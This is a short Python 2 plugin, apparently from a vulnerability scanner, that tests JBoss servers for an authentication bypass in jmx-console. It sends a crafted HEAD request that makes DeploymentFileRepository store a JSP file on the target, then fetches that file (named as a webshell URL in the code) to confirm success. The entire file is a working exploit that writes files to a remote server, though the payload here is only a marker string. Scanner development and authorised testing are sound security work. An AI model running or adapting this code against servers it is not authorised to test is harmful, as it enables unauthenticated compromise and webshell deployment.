# coding:utf-8
# author:wolf
import urllib2
import socket
import time
import random


def get_plugin_info():
    plugin_info = {
        "name": "Jboss 认证绕过",
        "info": "通过Head请求可绕过Jboos的登陆认证，攻击者可通过此漏洞直接获取服务器权限。",
        "level": "高危",
        "type": "认证绕过",
        "author": "wolf@YSRC",
        "url": "https://access.redhat.com/solutions/30744",
        "keyword": "tag:jboss",
        "source": 1
    }
    return plugin_info


def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH"))
    return str1


def check(host, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((host, int(port)))
        shell = "xunfeng"
        # s1.recv(1024)
        shellcode = ""
        name = random_str(5)
        for v in shell:
            shellcode += hex(ord(v)).replace("0x", "%")
        flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
               "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=xunfeng&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
               name) + shellcode + \
               "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
        s1.send(flag)
        data = s1.recv(512)
        s1.close()
        time.sleep(10)
        url = "http://%s:%d" % (host, int(port))
        webshell_url = "%s/%s/xunfeng.jsp" % (url, name)
        res = urllib2.urlopen(webshell_url, timeout=timeout)
        if 'xunfeng' in res.read():
            info = u"Jboss Authentication bypass url:%s" % (webshell_url)
            return info
    except Exception, e:
        pass
